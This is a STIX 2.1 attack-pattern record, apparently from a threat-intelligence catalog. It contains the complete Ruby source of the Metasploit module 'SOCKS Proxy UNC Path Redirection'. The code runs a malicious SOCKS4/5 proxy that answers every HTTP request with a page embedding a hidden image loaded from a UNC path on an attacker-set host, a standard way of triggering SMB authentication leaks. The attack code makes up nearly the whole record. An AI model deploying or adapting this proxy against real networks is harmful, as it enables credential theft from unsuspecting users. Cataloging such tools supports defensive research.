{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3033d3a0-3ff1-4424-9c9a-0658bd1985ce",
    "created": "2024-08-14T16:21:47.865901Z",
    "modified": "2024-08-14T16:21:47.865905Z",
    "name": "SOCKS Proxy UNC Path Redirection",
    "description": " This module provides a Socks proxy service that redirects all HTTP requests to a web page that loads a UNC path. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/socks_unc.rb",
            "external_id": "socks_unc.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n\n  def initialize\n    super(\n      'Name'        => 'SOCKS Proxy UNC Path Redirection',\n      'Description'    => %q{\n        This module provides a Socks proxy service\n      that redirects all HTTP requests to a web page that\n      loads a UNC path.\n      },\n      'Author'      => 'hdm',\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Proxy', 'Description' => 'Run SOCKS UNC proxy' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Proxy'\n        ],\n      'DefaultAction'  => 'Proxy'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',    [ true, \"The local port to listen on.\", 1080 ]),\n        OptString.new('UNCHOST',    [ false, \"The address of the UNC host.\", nil ])\n      ])\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def on_client_connect(client)\n    #print_status(\"New connection from #{client.peerhost}:#{client.peerport}\")\n  end\n\n  def on_client_data(client)\n    #print_status(\"Data from #{client.peerhost}:#{client.peerport}\")\n    process_socks(client)\n  end\n\n  def on_client_close(client)\n    #print_status(\"Closed connection from #{client.peerhost}:#{client.peerport}\")\n  end\n\n  def run\n    exploit()\n  end\n\n  def reject(client)\n    rej = \"\\x00\\x5b\" + (\"\\x00\" * 6)\n    client.put rej\n    true\n  end\n\n  def process_socks(client)\n    req = client.get_once\n    return if !(req and req.length > 2)\n\n    # Versions\n    case req[0,1]\n    when \"\\x04\"\n\n      sver, sreq, sport, shost, suser, sname = req.unpack('CCnA4Z*Z*')\n\n      # Handle connections only\n      if (sreq != 0x01)\n        return reject(client)\n      end\n\n      # Handle socks4a\n      if (shost[0,3] == \"\\x00\\x00\\x00\")\n        shost = sname\n      else\n        shost = shost.unpack('C*').join('.')\n      end\n\n      print_status(\"Connection attempt from #{client.peerhost}:#{client.peerport} to #{shost}:#{sport} #{suser.inspect}\")\n\n      client.put(\"\\x00\\x5a\\x00\\x00\\x00\\x00\\x00\\x00\")\n\n    when \"\\x05\"\n\n      sver, scnt, sauth = req.unpack('CCA*')\n      client.put(\"\\x05\\x00\")\n\n      req = client.get_once\n\n      sver, sreq, sdmp, stype = req.unpack('CCCC')\n\n      # Handle connections only\n      if (sreq != 0x01)\n        return reject(client)\n      end\n\n      saddr = req[4,req.length - 4]\n      case stype\n      when 0x01\n        shost = req[4,4].unpack('C*').join('.')\n        sport = req[8,2].unpack('n')[0]\n\n      when 0x03\n        shostlen = req[4]\n        shost    = req[5, shostlen]\n        sport    = req[5+shostlen, 2].unpack('n')[0]\n\n      when 0x04\n        shost = req[4,16].unpack('n').map{ |x| \"%.2x\" % x }.join(':')\n        sport = req[20,2].unpack('n')[0]\n      end\n\n      print_status(\"Connection attempt from #{client.peerhost}:#{client.peerport} to #{shost}:#{sport}\")\n\n      res = \"\\x05\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"\n      client.put res\n\n    else\n      return reject(client)\n    end\n\n\n    req = client.get_once\n    hed = req ? req.split(/\\n/)[0].strip : ''\n    host     = datastore['UNCHOST'] || Rex::Socket.source_address(client.peerhost)\n    share    = Rex::Text.rand_text_alpha(8)\n    filename = Rex::Text.rand_text_alpha(8)\n\n    print_status(\"Request from #{client.peerhost}:#{client.peerport}: #{hed}\")\n\n    body = %Q|\n      <html><head><title>#{Rex::Text.rand_text_alpha(8)}</title><head><body>\n        <img src=\"\\\\\\\\#{host}\\\\#{share}\\\\#{filename}.jpg\" style=\"visibility: hidden;\">\n      </body>\n      </html>\n    |.gsub(/\\s+/, ' ')\n\n    res  = \"HTTP/1.1 200 OK\\r\\n\"\n    res << \"Content-Type: text/html\\r\\n\"\n    res << \"Connection: Close\\r\\n\"\n    res << \"Content-Length: #{body.length}\\r\\n\\r\\n#{body}\"\n\n    client.put(res)\n  end\n\n\n\nend\n"
}